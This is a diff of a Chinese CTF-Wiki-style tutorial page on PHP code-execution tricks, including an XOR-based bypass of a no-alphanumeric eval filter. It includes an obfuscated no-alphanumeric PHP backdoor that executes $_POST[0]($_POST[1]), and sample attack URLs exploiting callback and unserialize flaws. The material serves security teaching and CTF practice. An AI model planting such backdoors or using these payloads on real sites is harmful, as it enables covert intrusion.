+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token comment" spellcheck="true">//$hint =  "php function getFlag() to get flag";</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这道题是 <code>xman</code> 训练赛的时候，梅子酒师傅出的一道题。这一串代码描述是这样子，我们要绕过 <code>A-Z</code>、<code>a-z</code>、<code>0-9</code> 这些常规数字、字母字符串的传参，将非字母、数字的字符经过各种变换，最后能构造出 <code>a-z</code> 中任意一个字符，并且字符串长度小于 <code>40</code> 。然后再利用 <code>PHP</code> 允许动态函数执行的特点，拼接出一个函数名，这里我们是 <code>getFlag</code>，然后动态执行该代码即可。</p>
 <p>那么，我们需要考虑的问题是如何通过各种变换，使得我们能够去成功读取到 <code>getFlag</code> 函数，然后拿到 <code>webshell</code> 。</p>
 <p>在理解这个之前，我们首先需要大家了解的是 <code>PHP</code> 中异或 <code>^</code> 的概念。</p>
 <p>我们先看一下下面这段代码：</p>
-<pre><code>&lt;?php
-    echo "A"^"?";
-?&gt;</code></pre><p>运行结果如下：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token keyword">echo</span> <span class="token string">"A"</span><span class="token operator">^</span><span class="token string">"?"</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>运行结果如下：</p>
 <p><img src="/images/loading.gif" data-original="https://ctf-wiki.org/web/php/figure/preg_match/answer1.png" alt=""></p>
 <p>我们可以看到，输出的结果是字符 <code>~</code>。之所以会得到这样的结果，是因为代码中对字符 <code>A</code> 和字符 <code>?</code> 进行了异或操作。在 <code>PHP</code> 中，两个变量进行异或时，先会将字符串转换成 <code>ASCII</code> 值，再将 <code>ASCII</code> 值转换成二进制再进行异或，异或完，又将结果从二进制转换成了 <code>ASCII</code> 值，再将 <code>ASCII</code> 值转换成字符串。异或操作有时也被用来交换两个变量的值。</p>
 <p>比如像上面这个例子</p>
 <pre><code>A` 的 `ASCII` 值是 `65` ，对应的二进制值是 `01000001
 ?` 的 ASCII 值是 `63` ，对应的二进制值是 `00111111</code></pre><p>异或的二进制的值是 <code>‭01111110‬</code> ，对应的 <code>ASCII</code> 值是 <code>126</code> ，对应的字符串的值就是 <code>~</code> 了</p>
 <p>我们都知道， <code>PHP</code> 是弱类型的语言，也就是说在 <code>PHP</code> 中我们可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。正是由于 <code>PHP</code> 弱类型的这个特点，我们对 <code>PHP</code> 的变量类型进行隐式的转换，并利用这个特点进行一些非常规的操作。如将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理，下面我们来看一段代码：</p>
-<pre><code>&lt;?php
-    function B(){
-        echo "Hello Angel_Kitty";
-    }
-    $_++;
-    $__= "?" ^ "}";
-    $__();
-?&gt;</code></pre><p>代码执行结果如下：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token keyword">function</span> <span class="token function">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"Hello Angel_Kitty"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span>
+    <span class="token variable">$__</span><span class="token operator">=</span> <span class="token string">"?"</span> <span class="token operator">^</span> <span class="token string">"}"</span><span class="token punctuation">;</span>
+    <span class="token variable">$__</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>代码执行结果如下：</p>
 <p><img src="/images/loading.gif" data-original="https://ctf-wiki.org/web/php/figure/preg_match/answer2.png" alt=""></p>
 <p>我们一起来分析一下上面这段代码：</p>
 <p>1、<code>$_++;</code> 这行代码的意思是对变量名为 <code>"_"</code> 的变量进行自增操作，在 <code>PHP</code> 中未定义的变量默认值 <code>null</code> ，<code>null==false==0</code> ，我们可以在不使用任何数字的情况下，通过对未定义变量的自增操作来得到一个数字。</p>
@@ -1172,90 +1197,103 @@ if(isset($_GET['code'])){
 <p>看到这里，相信大家如果再看到类似的 <code>PHP</code> 后门应该不会那么迷惑了，你可以通过一句句的分析后门代码来理解后门想实现的功能。</p>
 <p>我们希望使用这种后门创建一些可以绕过检测的并且对我们有用的字符串，如 <code>_POST</code> ， <code>system</code> ， <code>call_user_func_array</code>，或者是任何我们需要的东西。</p>
 <p>下面是个非常简单的非数字字母的 <code>PHP</code> 后门：</p>
-<pre><code>&lt;?php
-    @$_++; // $_ = 1
-    $__=("#"^"|"); // $__ = _
-    $__.=("."^"~"); // _P
-    $__.=("/"^"`"); // _PO
-    $__.=("|"^"/"); // _POS
-    $__.=("{"^"/"); // _POST 
-    ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);
-?&gt;</code></pre><p>在这里我说明下， <code>.=</code> 是字符串的连接，具体参看 <code>PHP</code> 语法</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    @<span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $_ = 1</span>
+    <span class="token variable">$__</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"#"</span><span class="token operator">^</span><span class="token string">"|"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $__ = _</span>
+    <span class="token variable">$__</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token operator">^</span><span class="token string">"~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// _P</span>
+    <span class="token variable">$__</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token operator">^</span><span class="token string">"`"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// _PO</span>
+    <span class="token variable">$__</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"|"</span><span class="token operator">^</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// _POS</span>
+    <span class="token variable">$__</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"{"</span><span class="token operator">^</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// _POST </span>
+    $<span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token variable">$_</span><span class="token punctuation">]</span><span class="token punctuation">(</span>$<span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token variable">$_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $_POST[0]($_POST[1]);</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在这里我说明下， <code>.=</code> 是字符串的连接，具体参看 <code>PHP</code> 语法</p>
 <p>我们甚至可以将上面的代码合并为一行，从而使程序的可读性更差，代码如下：</p>
 <pre><code>$__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");</code></pre><p>我们回到 <code>xman</code> 训练赛的那题来看，我们的想法是通过构造异或来去绕过那串字符，那么我们该如何构造这个字串使得长度小于 <code>40</code> 呢？</p>
 <p>我们最终是要读取到那个 <code>getFlag</code> 函数，我们需要构造一个 <code>_GET</code> 来去读取这个函数，我们最终构造了如下字符串：</p>
 <p><img src="/images/loading.gif" data-original="https://ctf-wiki.org/web/php/figure/preg_match/payloads.png" alt=""></p>
 <p>可能很多小伙伴看到这里仍然无法理解这段字符串是如何构造的吧，我们就对这段字符串进行段分析。</p>
 <h4 id="构造-GET-读取"><a href="#构造-GET-读取" class="headerlink" title="构造 _GET 读取"></a>构造 <code>_GET</code> 读取</h4><p>首先我们得知道 <code>_GET</code> 由什么异或而来的，经过我的尝试与分析，我得出了下面的结论：</p>
-<pre><code>&lt;?php
-    echo "`{{{"^"?&lt;&gt;/";//_GET
-?&gt;</code></pre><p>这段代码一大坨是啥意思呢？因为 40 个字符长度的限制，导致以前逐个字符异或拼接的 webshell 不能使用。<br>这里可以使用 php 中可以执行命令的反引号 ``` 和 <code>Linux</code> 下面的通配符 <code>?</code></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token keyword">echo</span> <span class="token string">"`{{{"</span><span class="token operator">^</span><span class="token string">"?&lt;>/"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//_GET</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>这段代码一大坨是啥意思呢？因为 40 个字符长度的限制，导致以前逐个字符异或拼接的 webshell 不能使用。<br>这里可以使用 php 中可以执行命令的反引号 ``` 和 <code>Linux</code> 下面的通配符 <code>?</code></p>
 <ul>
 <li><code>?</code> 代表匹配一个字符</li>
 <li>``` 表示执行命令</li>
 <li><code>"</code> 对特殊字符串进行解析</li>
 </ul>
 <p>由于 <code>?</code> 只能匹配一个字符，这种写法的意思是循环调用，分别匹配。我们将其进行分解来看：</p>
-<pre><code>&lt;?php
-    echo "{"^"&lt;";
-?&gt;</code></pre><p>输出结果为：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token keyword">echo</span> <span class="token string">"{"</span><span class="token operator">^</span><span class="token string">"&lt;"</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>输出结果为：</p>
 <p><img src="/images/loading.gif" data-original="https://ctf-wiki.org/web/php/figure/preg_match/answer3.png" alt=""></p>
-<pre><code>&lt;?php
-    echo "{"^"&gt;";
-?&gt;</code></pre><p>输出结果为：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token keyword">echo</span> <span class="token string">"{"</span><span class="token operator">^</span><span class="token string">">"</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>输出结果为：</p>
 <p><img src="/images/loading.gif" data-original="https://ctf-wiki.org/web/php/figure/preg_match/answer4.png" alt=""></p>
-<pre><code>&lt;?php
-    echo "{"^"/";
-?&gt;</code></pre><p>输出结果为：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token keyword">echo</span> <span class="token string">"{"</span><span class="token operator">^</span><span class="token string">"/"</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>输出结果为：</p>
 <p><img src="/images/loading.gif" data-original="https://ctf-wiki.org/web/php/figure/preg_match/answer5.png" alt=""></p>
 <p>所以我们可以知道， <code>_GET</code> 就是这么被构造出来的啦！</p>
 <h4 id="获取-GET-参数"><a href="#获取-GET-参数" class="headerlink" title="获取 _GET 参数"></a>获取 <code>_GET</code> 参数</h4><p>我们又该如何获取 <code>_GET</code> 参数呢？咱们可以构造出如下字串：</p>
-<pre><code>&lt;?php
-    echo ${$_}[_](${$_}[__]);//$_GET[_]($_GET[__])
-?&gt;</code></pre><p>根据前面构造的来看， <code>$_</code> 已经变成了 <code>_GET</code> 。顺理成章的来讲， <code>$_ = _GET</code> 。我们构建 <code>$_GET[__]</code> 是为了要获取参数值。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token keyword">echo</span> $<span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">(</span>$<span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//$_GET[_]($_GET[__])</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>根据前面构造的来看， <code>$_</code> 已经变成了 <code>_GET</code> 。顺理成章的来讲， <code>$_ = _GET</code> 。我们构建 <code>$_GET[__]</code> 是为了要获取参数值。</p>
 <h4 id="传入参数"><a href="#传入参数" class="headerlink" title="传入参数"></a>传入参数</h4><p>此时我们只需要去调用 <code>getFlag</code> 函数获取 <code>webshell</code> 就好了，构造如下：</p>
-<pre><code>&lt;?php
-    echo $_=getFlag;//getFlag
-?&gt;</code></pre><p>所以把参数全部连接起来，就可以了。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token keyword">echo</span> <span class="token variable">$_</span><span class="token operator">=</span>getFlag<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//getFlag</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>所以把参数全部连接起来，就可以了。</p>
 <p><img src="/images/loading.gif" data-original="https://ctf-wiki.org/web/php/figure/preg_match/payloads.png" alt=""></p>
 <p>结果如下：</p>
 <p><img src="/images/loading.gif" data-original="https://ctf-wiki.org/web/php/figure/preg_match/flag.png" alt=""></p>
 <p>于是我们就成功地读取到了 flag！</p>
 <h3 id="动态函数执行"><a href="#动态函数执行" class="headerlink" title="动态函数执行"></a>动态函数执行</h3><p>用户自定义的函数可以导致代码执行。</p>
-<pre><code>&lt;?php
-$dyn_func = $_GET["dyn_func"];
-$argument = $_GET["argument"];
-$dyn_func($argument);
-?&gt;</code></pre><h3 id="反引号命令执行"><a href="#反引号命令执行" class="headerlink" title="反引号命令执行"></a>反引号命令执行</h3><pre><code>&lt;?php
-echo `ls -al`;
-?&gt;</code></pre><h3 id="Curly-Syntax"><a href="#Curly-Syntax" class="headerlink" title="Curly Syntax"></a>Curly Syntax</h3><p>PHP 的 Curly Syntax 也能导致代码执行，它将执行花括号间的代码，并将结果替换回去。</p>
-<pre><code>&lt;?php
-$var = "aaabbbccc ${`ls`}";
-?&gt;
-&lt;?php
-$foobar = "phpinfo";
-${"foobar"}();
-?&gt;</code></pre><h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p>很多函数都可以执行回调函数，当回调函数用户可控时，将导致代码执行。</p>
-<pre><code>&lt;?php
-$evil_callback = $_GET["callback"];
-$some_array = array(0,1,2,3);
-$new_array = array_map($evil_callback, $some_array);
-?&gt;</code></pre><p>攻击 payload</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$dyn_func</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"dyn_func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$argument</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"argument"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$dyn_func</span><span class="token punctuation">(</span><span class="token variable">$argument</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="反引号命令执行"><a href="#反引号命令执行" class="headerlink" title="反引号命令执行"></a>反引号命令执行</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">echo</span> `ls <span class="token operator">-</span>al`<span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="Curly-Syntax"><a href="#Curly-Syntax" class="headerlink" title="Curly Syntax"></a>Curly Syntax</h3><p>PHP 的 Curly Syntax 也能导致代码执行，它将执行花括号间的代码，并将结果替换回去。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$var</span> <span class="token operator">=</span> <span class="token string">"aaabbbccc ${`ls`}"</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+<span class="token delimiter">&lt;?php</span>
+<span class="token variable">$foobar</span> <span class="token operator">=</span> <span class="token string">"phpinfo"</span><span class="token punctuation">;</span>
+$<span class="token punctuation">{</span><span class="token string">"foobar"</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p>很多函数都可以执行回调函数，当回调函数用户可控时，将导致代码执行。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$evil_callback</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"callback"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$some_array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$new_array</span> <span class="token operator">=</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$evil_callback</span><span class="token punctuation">,</span> <span class="token variable">$some_array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>攻击 payload</p>
 <pre><code>http://www.a.com/index.php?callback=phpinfo</code></pre><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>如果 <code>unserialize()</code> 在执行时定义了 <code>__destruct()</code> 或 <code>__wakeup()</code> 函数，则有可能导致代码执行。</p>
-<pre><code>&lt;?php
-class Example {
-  var $var = "";
-  function __destruct() {
-    eval($this-&gt;var);
-  }
-}
-unserialize($_GET["saved_code"]);
-?&gt;</code></pre><p>攻击 payload</p>
-<pre><code>http://www.a.com/index.php?saved_code=O:7:"Example":1:{s:3:"var";s:10:"phpinfo();";}</code></pre><h2 id="PHP-特性"><a href="#PHP-特性" class="headerlink" title="PHP 特性"></a>PHP 特性</h2><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><pre><code>&lt;?php
-$var = 1;
-$var = array();
-$var = "string";
-?&gt;</code></pre><p>php 不会严格检验传入的变量类型，也可以将变量自由的转换类型。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">Example</span> <span class="token punctuation">{</span>
+  <span class="token keyword">var</span> <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+  <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"saved_code"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>攻击 payload</p>
+<pre><code>http://www.a.com/index.php?saved_code=O:7:"Example":1:{s:3:"var";s:10:"phpinfo();";}</code></pre><h2 id="PHP-特性"><a href="#PHP-特性" class="headerlink" title="PHP 特性"></a>PHP 特性</h2><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$var</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token variable">$var</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$var</span> <span class="token operator">=</span> <span class="token string">"string"</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>php 不会严格检验传入的变量类型，也可以将变量自由的转换类型。</p>
 <p>比如在 <code>$a == $b</code> 的比较中</p>
 <pre><code>$a = null; 
 $b = false; //为真 
@@ -1935,7 +1973,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">1257.5k</span>&nbsp;字
+                class="white-color">1222.3k</span>&nbsp;字
             
             
             
